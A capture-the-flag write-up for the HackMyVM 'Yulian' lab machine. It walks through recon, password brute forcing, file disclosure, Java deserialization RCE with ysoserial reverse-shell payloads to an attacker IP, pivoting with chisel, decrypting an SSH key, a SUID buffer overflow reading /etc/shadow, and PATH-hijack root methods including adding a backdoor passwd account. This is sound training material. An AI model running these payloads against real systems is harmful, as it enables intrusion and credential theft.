# Yulian

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.31:80
Open 10.0.2.31:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.31

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 fc:b2:88:5d:09:d8:06:40:81:cd:5a:5c:53:79:60:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO1N5rmjtgOChZs+hGYnBv6dCZkZZ+VhY0xgHTlQlT535zqHN9wubPYcEfo298ICSTz47cocGrz0cYvwv1PKSLU=
|   256 5b:b9:4d:de:03:f0:ee:72:d3:e3:e9:9d:e8:f1:3f:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/OSQCBvlGr72L/mVMCmoEWWfohWVczDu9gvWJA2gNO
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Linux Terminal Simulator
```
:::

## HTTP (80)

Website is running some kind of custom shell, it's actually `index.html` so Javascript is running client side code only.

![writeup.png](/assets/pentest/hackmyvm/yulian/writeup.png)

Nothing except `index.html` from fuzzing
```bash
‚îî‚îÄ$ feroxbuster -u http://yulian.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
```

## HTTP (8080)

At this point we have a static webpage and nothing to go on, just in case we should rerun nmap to test if there's any more ports and just as suspected there's more which first scan missed!

```bash
8080/tcp open  http    syn-ack Apache Tomcat (language: en)
| http-title: Login
|_Requested resource was http://10.0.2.31:8080/login.html
|_http-favicon: Spring Java Framework
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
```

```bash
‚îî‚îÄ$ feroxbuster -u http://yulian.hmv:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n
302      GET        0l        0w        0c http://yulian.hmv:8080/ => http://yulian.hmv:8080/login.html
500      GET        1l        3w      105c http://yulian.hmv:8080/error
200      GET        1l        4w     1738c http://yulian.hmv:8080/favicon.ico
302      GET        0l        0w        0c http://yulian.hmv:8080/logout => http://yulian.hmv:8080/login.html
405      GET        1l        7w      149c http://yulian.hmv:8080/login
200      GET       82l      162w     2270c http://yulian.hmv:8080/login.html
200      GET        1l        1w       47c http://yulian.hmv:8080/success
200      GET        1l        4w       39c http://yulian.hmv:8080/test
```

### Bruteforce

Kind of stupid, but we have to bruteforce the password. For username I chose `admin` the most common and it was a success.
```bash
‚îî‚îÄ$ hydra -l admin -P $rockyou yulian.hmv http-post-form "/login:username=^USER^&password=^PASS^:Wrong username or password" -s 8080 -I
[8080][http-post-form] host: yulian.hmv   login: admin   password: 123457
```

Great... we just get a cookie!
```bash
‚îî‚îÄ$ curl http://yulian.hmv:8080/login -d 'username=admin&password=123457' -iL
HTTP/1.1 302
Set-Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=; Path=/; HttpOnly
Location: http://yulian.hmv:8080/success
Content-Length: 0
Date: Sun, 31 Aug 2025 20:07:46 GMT

HTTP/1.1 200
Content-Type: text/plain;charset=UTF-8
Content-Length: 47
Date: Sun, 31 Aug 2025 20:07:46 GMT

<script>window.location='/login.html';</script> 
```

### LFI

My usual `feroxbuster` scan ignored `404,403,400` codes, but considering it's Java I only left `404` and looks like I missed endpoint üìùmemo
```bash
‚îî‚îÄ$ feroxbuster -u http://yulian.hmv:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404 --dont-scan js,css,png,jpeg,jpg,gif -n
...
400      GET        1l        8w      158c http://yulian.hmv:8080/download
...
```

```bash
‚îî‚îÄ$ curl http://yulian.hmv:8080/download -s | jq
{
  "timestamp": "2025-08-31T20:13:25.296+0000",
  "status": 400,
  "error": "Bad Request",
  "message": "Required String parameter 'file' is not present",
  "path": "/download"
}
‚îî‚îÄ$ curl 'http://yulian.hmv:8080/download?file=index.html'
<h1>Forbidden access

‚îî‚îÄ$ curl 'http://yulian.hmv:8080/download?file=index.html' -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='
index.html 

‚îî‚îÄ$ curl 'http://yulian.hmv:8080/download?file=/etc/passwd' -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -s | grep sh$
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
```

Download the Java source code
```bash
‚îî‚îÄ$ curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' 'http://yulian.hmv:8080/download?file=/proc/self/cmdline' -o-
java-jarjavaserver-0.0.1-SNAPSHOT.jar                                                                                                                                                                             
‚îî‚îÄ$ curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' 'http://yulian.hmv:8080/download?file=/proc/self/cmdline' -s | tr '\0' ' '
java -jar javaserver-0.0.1-SNAPSHOT.jar 

‚îî‚îÄ$ curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' 'http://yulian.hmv:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar' -o javaserver-0.0.1-SNAPSHOT.jar
```

Inspect code
```bash
‚îî‚îÄ$ jd-gui javaserver-0.0.1-SNAPSHOT.jar
```

Application has a `deserialize` route which is a dangerous method, but for us it mean RCE

![writeup-1.png](/assets/pentest/hackmyvm/yulian/writeup-1.png)

### RCE

[ysoserial](https://github.com/frohoff/ysoserial) is the best tool for this kind of job: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

```bash
‚îî‚îÄ$ docker pull frohoff/ysoserial:latest
‚îî‚îÄ$ docker run ---rm frohoff/ysoserial CommonsCollections1 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' > rev.bin
‚îî‚îÄ$ curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' 'http://yulian.hmv:8080/deserialize' --data-binary @rev.bin 
{"timestamp":"2025-09-01T00:43:38.690+0000","status":400,"error":"Bad Request","message":"Required request body is missing: public java.lang.String org.example.javaserver.controller.VulnController.deserialize(byte[],javax.servlet.http.HttpServletRequest)","path":"/deserialize"} 
‚îî‚îÄ$ curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' 'http://yulian.hmv:8080/deserialize' --data-binary @rev.bin  -H 'Content-Type: application/octet-stream'
{"timestamp":"2025-09-01T00:43:38.690+0000","status":400,"error":"Bad Request","message":"Required request body is missing: public java.lang.String org.example.javaserver.controller.VulnController.deserialize(byte[],javax.servlet.http.HttpServletRequest)","path":"/deserialize"} 
```

I was using  the usual payload, however it kept failing, and maybe GPT is right; It has too man special characters

![writeup-2.png](/assets/pentest/hackmyvm/yulian/writeup-2.png)

Fail
```bash
# bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx|base64 -d|bash'
docker run --rm frohoff/ysoserial CommonsCollections5 "bash -c 'echo $(echo -n 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' | base64)|base64 -d|bash'" 2>/dev/null \
    | curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' \
    'http://yulian.hmv:8080/deserialize' \
    -H 'Content-Type: application/octet-stream' \
    --data-binary @-
```

## Reverse Shell (Docker Root)

Bash expansion trick is a success (for unknown reason)
```bash
payload=$(echo -n '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' | base64)
docker run --rm frohoff/ysoserial CommonsCollections5 "bash -c {echo,$payload}|{base64,-d}|{bash,-i}" 2>/dev/null \
    | curl -b 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' \
    'http://yulian.hmv:8080/deserialize' \
    -H 'Content-Type: application/octet-stream' \
    --data-binary @-
```

> **Note**: Specifying the **Content-Type** in request was very important as it turned out, default www-url-encoded was not accepted by the request handler.

![writeup-3.png](/assets/pentest/hackmyvm/yulian/writeup-3.png)

`nc`, `busybox` exists on box so that's also an alternative.

[https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Java/#ysoserial](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Java/#ysoserial)

### User.txt

```bash
bash-4.4# cat user.txt
flag{ce6560c893e5cfec48e0fd186dc03718}
```

## Lateral Movement

The Docker container is pretty much empty, no more servers or applications, no credentials stored, nothing. But there could be other hosts on the network
```bash
bash-4.4# ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

# Ping sweep
bash-4.4# for i in $(seq 1 254); do ping -c1 -W1 172.17.0.$i >/dev/null && echo $i; done
1
2
3
```

### Neighbor Host

```bash
bash-4.4# curl -LOs https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x86_64.tar.gz
bash-4.4# tar -xvzf nmap-x86_64.tar.gz
bash-4.4# cd x86_64
	bash-4.4# ./nmap -T5 -v -Pn 172.17.0.3
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

bash-4.4# curl 172.17.0.3
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Introduction to Brute Force Attacks</title>
  <style> ... </style>
</head>
<body>
  <header>
    <h1>Introduction to Brute Force Attacks</h1>
  </header>

  <main>
    <h2>What is a Brute Force Attack?</h2>
    <p>A brute force attack is a method of trial and error used to crack passwords or encryption keys by systematically trying every possible combination until the correct one is found.</p>

    <h2>Common Types of Brute Force Attacks</h2>
    <ul>
      <li><strong>Pure Brute Force</strong>: Trying every combination from <code>aaaa</code> to <code>zzzz</code>.</li>
      <li><strong>Dictionary Attack</strong>: Using a list of common passwords to guess the correct one.</li>
      <li><strong>Hybrid Attack</strong>: Combining dictionary words with common variations (e.g., adding 123, changing letter cases, etc.).</li>
    </ul>

    <h2>Characteristics of Brute Force Attacks</h2>
    <ul>
      <li>Does not rely on software vulnerabilities, only on guess attempts.</li>
      <li>Time-consuming, complexity increases exponentially with password length and character set.</li>
      <li>Can be automated using tools such as Python scripts, Hydra, John the Ripper, etc.</li>
    </ul>

    <h2>Defense Against Brute Force Attacks</h2>
    <ul>
      <li>Implement <strong>account lockout</strong> policies, such as locking the account after 5 failed attempts.</li>
      <li>Use <strong>CAPTCHA</strong> to block automated scripts.</li>
      <li>Limit <strong>login rate</strong>, for example, allow only 3 attempts every 5 minutes.</li>
      <li>Enforce <strong>strong passwords</strong> (long and complex).</li>
      <li>Monitor login activity and detect abnormal login attempts.</li>
    </ul>

    <h2>Legal Use and Warning</h2>
    <p>Brute force techniques can be used for penetration testing and security audits, but unauthorized use is illegal. Always follow applicable laws and regulations.</p>
  </main>
  <!--500-worst-passwords-->
  <footer>
    &copy; 2025 Cybersecurity Learning Page | For educational use only
  </footer>
</body>
</html>
```

#### Port Forward

Since I had **Penelope** I thought I could use it to do port forwarding, but not without Python.
```bash
(Penelope)> use 6
(Penelope)‚îÄ(Session [6])> portfwd 172.17.0.3:80->0.0.0.0:8000
[-] This can only run in python agent mode
```

socat also failed
```bash
bash-4.4# /var/tmp/socat -d -d TCP-LISTEN:8000,bind=0.0.0.0,fork,reuseaddr TCP:172.17.0.3:80 &
---
‚îî‚îÄ$ curl yulian.hmv:8000
curl: (7) Failed to connect to yulian.hmv port 8000 after 2 ms: Couldn't connect to server
```

```bash
‚îî‚îÄ$ chisel server --reverse -p 36000
---
bash-4.4# curl 10.0.2.15/chisel -sO
bash-4.4# chmod +x chisel
bash-4.4# ./chisel client 10.0.2.15:36000 R:172.17.0.3:80 &
```

![writeup-4.png](/assets/pentest/hackmyvm/yulian/writeup-4.png)

HTTP has nothing
```bash
‚îî‚îÄ$ feroxbuster -u http://0/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough -D -C 404,400,403 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
200      GET       95l      324w     3038c http://0.0.0.0/index.html
```

The SSH is open and the comment in HTML indicates we should probably bruteforce the SSH
```bash
‚îî‚îÄ$ locate 500-worst-passwords
/usr/share/seclists/Passwords/500-worst-passwords.txt
/usr/share/seclists/Passwords/500-worst-passwords.txt.bz2
/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
```

#### Bruteforce

The SSH was very slow and I had to use timeout for each connection
```bash
bash-4.4# ./chisel client 10.0.2.15:36000 R:2222:172.17.0.3:22
‚îî‚îÄ$ hydra -l root -P /usr/share/seclists/Passwords/500-worst-passwords.txt 127.0.0.1 ssh -s 2222 -I -V -c 3
[2222][ssh] host: 127.0.0.1   login: root   password: mountain
```

```bash
‚îî‚îÄ$ sshpass -p 'mountain' ssh root@0 -p 2222
6ab28be27b0c:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### SSH

```bash
6ab28be27b0c:/# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -qO- | sh
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Unmounted file-system?
‚ïö Check if you can mount umounted devices
/dev/cdrom      /media/cdrom    iso9660 noauto,ro 0 0
/dev/usbdisk    /media/usb      vfat    noauto,ro 0 0
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Container related tools present (if any):
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Container & breakout enumeration
‚ïö https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html
‚ïê‚ï£ Container ID ................... 6ab28be27b0c
...
‚ïê‚ï£ Container escape tools present .. /usr/bin/nsenter
...
‚ïê‚ïê‚ï£ Cron jobs list
/etc/crontabs:
total 16
drwxr-xr-x    2 root     root          4096 May 30 12:13 .
drwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..
-rw-------    1 root     root           283 Mar 25 13:16 root
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ .sh files in path
‚ïö https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/findssl.sh
...
```

Nothing too much from linpeas enumeration. While going over the system manually we find unusual file in `/etc`
```bash
6ab28be27b0c:/# find /etc -maxdepth 1 -type f -exec ls -lh {} \;
...
-rw-r--r--    1 root     root         400 Jun 24 17:57 /etc/output.enc
...

6ab28be27b0c:/# cat /etc/output.enc | xxd
00000000: 7c05 1afc ebeb 2c99 08d4 5056 7dd0 c762  |.....,...PV}..b
00000010: 57e7 ae35 3a7b 9afd 8566 f407 ec7b a47b  W..5:{...f...{.{
00000020: 2bca 0dbe d60d 4ee3 11e9 365d af29 f61c  +.....N...6].)..
00000030: 57e3 da30 7434 d27e 5581 c648 bd27 cd6f  W..0t4.~U..H.'.o
00000040: 671d 6f6b 8ca1 95de bd29 e669 1a23 3b93  g.ok.....).i.#;.
00000050: be61 eb29 d175 93ab b8c8 6b1a 88d1 a1cd  .a.).u....k.....
00000060: 4cb7 d8d9 d903 1501 4446 c7c2 1afd dcb4  L.......DF......
00000070: a4df bb9b dd59 3cec b87f f913 271f a6bf  .....Y<.....'...
00000080: 6d0f b207 0395 bf1f 8911 8a25 419b 1f7c  m..........%A..|
00000090: 6abe eee2 da55 0f6b f402 0c0a 04a3 0fed  j....U.k........
000000a0: 51f0 6772 72f5 cd94 d1a3 df96 705e 08d5  Q.grr.......p^..
000000b0: 6866 0ed9 89f1 3319 3d8b bde1 c9a3 5442  hf....3.=.....TB
000000c0: 41b2 74e4 a402 bfab 4933 d1fc 523a a451  A.t.....I3..R:.Q
000000d0: 1060 1211 fc3e 5ebb 84b7 b455 3252 b638  .`...>^....U2R.8
000000e0: 282d 1ab3 f2ed fff4 3395 d350 de30 f2f8  (-......3..P.0..
000000f0: 568b 017b 6363 7fe2 cca8 b6f7 5897 363b  V..{cc......X.6;
00000100: b71c f3b3 c316 d1cc f536 b31c a621 e33f  .........6...!.?
00000110: ac6b b30d dd45 ad5e 9ab4 49f2 7845 5109  .k...E.^..I.xEQ.
00000120: ca94 ea34 4091 6f3f 1085 7b8e d838 06e0  ...4@.o?..{..8..
00000130: ee90 4306 1d13 2ea2 9db3 67d3 5d90 3068  ..C.......g.].0h
00000140: 0191 f8e2 c5d1 9381 0e58 045e 7907 0f8f  .........X.^y...
00000150: 7254 6abc eaaf 4bc8 9ab5 9c59 6ba3 6884  rTj...K....Yk.h.
00000160: 050e 1fd9 8061 ac51 22e4 9af7 044d 5c0e  .....a.Q"....M\.
00000170: 106b 4caa 6be0 6db2 0ce7 7cd2 7d2a 88ca  .kL.k.m...|.}*..
00000180: 8e65 50c8 75d7 285e 43c6 c82e 0ddb 67fb  .eP.u.(^C.....g.
```

#### Reverse Engineering

There's also unusual binary in `/usr/bin` (Suspected from `/usr/bin/findssl.sh` location)
```bash
6ab28be27b0c:/# find /usr/bin -type f -exec ls -lh {} \;
...
-rwxr-xr-x    1 root     root      753.9K Jun 24 13:15 /usr/bin/userLogin
...
```

Binary doesn't seem to have any help menu, only error message.
```bash
6ab28be27b0c:/tmp# /usr/bin/userLogin --help
error: No such file or directory
6ab28be27b0c:/tmp# /usr/bin/userLogin /etc/passwd
error: No such file or directory
6ab28be27b0c:/tmp# ls -lh
total 0
-rw-r--r--    1 root     root           0 Sep  1 03:57 output.enc
```

Copy binary for inspection
```bash
‚îî‚îÄ$ sshpass -p 'mountain' scp -P 2222 root@0:/usr/bin/userLogin .
‚îî‚îÄ$ ghidra_auto ./userLogin -t -c
[*] File Ouput:
        ELF 64-bit LSB executable
        x86-64
        version 1 (GNU/Linux)
        statically linked
        BuildID[sha1]=305ce3b4a93ea685f30546b2754e008f7cf0f249
        for GNU/Linux 3.2.0
        not stripped
[+] Pwntools Checksec:
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Running Analysis...
```

The main function calls `encrypt_file` right away. It has `INPUT_FILE=id_ed25519` and `OUTPUT_FILE=output.enc` constants for reading and saving files.

![writeup-5.png](/assets/pentest/hackmyvm/yulian/writeup-5.png)

The key is fixed

![writeup-7.png](/assets/pentest/hackmyvm/yulian/writeup-7.png)

and the output is `key-for-user-ldz`

![writeup-6.png](/assets/pentest/hackmyvm/yulian/writeup-6.png)

Finally the encryption uses something called **xtea**, we have the output and we have the key so we should be able to decrypt the file.

#### XTEA Decrypt

Using [XTEA (eXtended TEA)](https://asecuritysite.com/encryption/xtea) as reference I was to able to decrypt the file with a lot of struggle, `xtea_decrypt` method used 32 rounds by default and I didn't pay attention (big mistake). After some tinkering it worked out.
```python
import struct
from argparse import ArgumentParser
from pathlib import Path


class XTEA:
    DELTA = 0x9E3779B9
    MASK = 0xFFFFFFFF

    @staticmethod
    def decrypt_block(key: bytes, block: bytes, rounds: int) -> bytes:
        """Decrypt a single 8-byte block using XTEA."""
        if len(key) != 16:
            raise ValueError("Key must be exactly 16 bytes")
        if len(block) != 8:
            raise ValueError("Block must be exactly 8 bytes")

        v0, v1 = struct.unpack("<2I", block)  # little-endian 2x uint32
        k = struct.unpack("<4I", key)         # little-endian 4x uint32

        sum_ = (XTEA.DELTA * rounds) & XTEA.MASK
        for _ in range(rounds):
            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum_ + k[(sum_ >> 11) & 3]))) & XTEA.MASK
            sum_ = (sum_ - XTEA.DELTA) & XTEA.MASK
            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum_ + k[sum_ & 3]))) & XTEA.MASK

        return struct.pack("<2I", v0, v1)


def main():
    parser = ArgumentParser()
    parser.add_argument("-f", "--file", required=True, help="Encrypted input file")
    parser.add_argument("-o", "--out", default="decrypted.bin", help="Output file (default: decrypted.bin)")
    parser.add_argument("-k", "--key", required=True, help="Key string (will be padded/truncated to 16 bytes)")
    parser.add_argument("-r", "--rounds", type=int, default=64, help="Number of XTEA rounds (default: 64)")
    args = parser.parse_args()

    # Normalize key to 16 bytes
    key = args.key.encode("utf-8")
    if len(key) < 16:
        key = key.ljust(16, b"\0")
    elif len(key) > 16:
        key = key[:16]

    enc_path, out_path = Path(args.file), Path(args.out)

    decrypted = bytearray()
    with enc_path.open("rb") as f:
        while True:
            block = f.read(8)
            if not block:
                break
            if len(block) < 8:
                raise ValueError("Encrypted file is not a multiple of 8 bytes")
            decrypted.extend(XTEA.decrypt_block(key, block, args.rounds))

    # Strip trailing zero padding like the C code
    decrypted = decrypted.rstrip(b"\x00")

    out_path.write_bytes(decrypted)
    print(f"[+] Decryption complete: {out_path} ({len(decrypted)} bytes)")


if __name__ == "__main__":
    main()
```

```bash
‚îî‚îÄ$ py /media/sf_VBoxShare/t.py -f 'output.enc' -k 'key-for-user-ldz' -o /dev/stdout
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDG60tqgYFFVx4ClSFGSIVssmKW6ibCoViuF9E8HQayZgAAAJBa9KyZWvSs
mQAAAAtzc2gtZWQyNTUxOQAAACDG60tqgYFFVx4ClSFGSIVssmKW6ibCoViuF9E8HQayZg
AAAEDkh1u30NCdjW5cB2TK+hkOBod+D7EKn6vZPHcyHL/ljMbrS2qBgUVXHgKVIUZIhWyy
YpbqJsKhWK4X0TwdBrJmAAAADWxkekBsb2NhbGhvc3Q=
-----END OPENSSH PRIVATE KEY-----
```

## SSH (22)

```bash
‚îî‚îÄ$ chmod 600 id_rsa.ldz
‚îî‚îÄ$ ssh ldz@yulian.hmv -i id_rsa.ldz
Warning: Permanently added 'yulian.hmv' (ED25519) to the list of known hosts.

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
```

### Buffer Overflow

`~/.viminfo` showed that `/opt/vuln.c` was opened. Currently there's no C code, however binary exists. It's also owned by root and has SUID bit.
```bash
localhost:/opt$ file vuln
vuln: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, BuildID[sha1]=c87268410577b342f9216cff03ec7962d0a9a046, with debug_info, not stripped
localhost:/opt$ ./vuln
FUCK
flag = 0
password wrong
localhost:/opt$ ./vuln
FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUCK
flag = 1431655765
password wrong
localhost:/opt$ UUUUUUUUUUUUUCK
-sh: UUUUUUUUUUUUUCK: not found
```

```bash
‚îî‚îÄ$ scp -i id_rsa.ldz ldz@yulian.hmv:/opt/vuln .
```

Very basic buffer overflow. There's a buffer of 32, but we are trying to read 48 bytes which causes some bytes to leak outside the array region.

![writeup-8.png](/assets/pentest/hackmyvm/yulian/writeup-8.png)

Fuzz for values
```bash
localhost:/opt$ for i in $(seq 1 100); do echo $i; printf '%*s\n' "$i" '' | tr ' ' '1' | /opt/vuln; done
...
43
flag = 0
password wrong
44
flag = 10
password wrong
45
flag = 2609
password wrong
...
```

At 44 character the rest of the strings starts to overflow inside compare value. Actually here we are sending 43 1 characters and newline. `ord(10)=\n`

Send 43 any characters and then `0x01` because that's what needs to complete strcmp and trigger `secret` function which reads `/etc/shadow`.
```bash
localhost:/opt$ echo -n $'11111111111111111111111111111111111111111111\x01' | /opt/vuln | grep '\$'
root:$6$W5FUwrTeo8vXfNot$qJazigaYSqk8ezVfjHckZb2XjxkrJsniQa5MA1o.j9apE1BMYX5vYuJVEJ2hYbNsR0q9IWOSSt1I40vNYxvKO0:20263:0:::::
ldz:$6$qCU7eP8wj/Pvo1FB$Ooou6p.TF3M/kMB29XrzQ6XVNbq7c46lGzNvRPOJ55GAXJ0h.jmbc8VHhGjFgwXLHPSbNt96l/rmUYgDqpo8Y0:20263:0:99999:7:::
```

```powershell
‚ûú john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
yulianateamo     (root)
```

```bash
localhost:/opt$ su
Password:
/opt # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Root.txt

```bash
/opt # cat /root/root.txt
flag{98ecb90d5dcef41e1bd18f47697f287a}
```

## Alternative

### Root Bash

> **Note**: **bash** doesn't exist!

We could have elevated our permissions with `bash` using `/tmp/rootbash -p` flag, however it doesn't exist on box and `sh` or `ash` don't support this.

This will work because SUID binary is not using Absolute path to `cat` (`/bin/cat`), but relative. Binary filenames are found from left to right in PATH directories, hence we can inject `/tmp`, create malicious binary and do whatever.

```bash
localhost:/tmp$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp/cat
localhost:/tmp$ chmod 777 /tmp/cat
localhost:/tmp$ export PATH=/tmp:$PATH
localhost:/tmp$ echo -n $'11111111111111111111111111111111111111111111\x01' | /opt/vuln
localhost:/tmp$ ls /tmp/rootsh  -lh
-rwsrwxrwx    1 root     ldz       789.8K Sep  1 14:44 /tmp/rootbash
```

### NetCat

Getting a reverse shell also gives Shell as Root

![writeup-9.png](/assets/pentest/hackmyvm/yulian/writeup-9.png)

### Passwd

```bash
localhost:/tmp$ h=$(head -1 /etc/passwd | sed "s#root:x#letmein:$(openssl passwd -6 -salt salty Password123)#")
localhost:/tmp$ echo -e "#!/bin/sh\necho '$h' >> /etc/passwd" > /tmp/cat
localhost:/tmp$ echo -n $'11111111111111111111111111111111111111111111\x01' | PATH=/tmp:$PATH /opt/vuln
localhost:/tmp$ su - letmein
Password: Password123
localhost:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### TTY Injection

Since the vulnerable system doesn‚Äôt give you a real root shell and you can‚Äôt use `bash -p` to keep privileges, you redirect the shell‚Äôs input from your terminal device (`/dev/pts/0`) so `/bin/sh` reads from your keyboard instead of the payload file. That way, when the root-owned program calls your fake `cat`, it spawns an interactive root shell connected directly to your terminal.

```bash
localhost:/tmp$ tty
/dev/pts/0
localhost:/tmp$ echo $'#!/bin/sh\n/bin/sh < /dev/pts/0' > /tmp/cat
localhost:/tmp$ chmod +x /tmp/cat
localhost:/tmp$ echo -n $'11111111111111111111111111111111111111111111\x01' | PATH=/tmp:$PATH /opt/vuln
/tmp # id
uid=0(root) gid=1000(ldz) groups=1000(ldz)
```

> **Note**: Credits to [https://7r1umphk.github.io/post/nei-bu-\_yulian.html](https://7r1umphk.github.io/post/nei-bu-_yulian.html) , that's where **I** learned it from.

### Etc

![https://media.tenor.com/cypJP2-K_k0AAAAM/kids-spinning.gif](https://media.tenor.com/cypJP2-K_k0AAAAM/kids-spinning.gif)

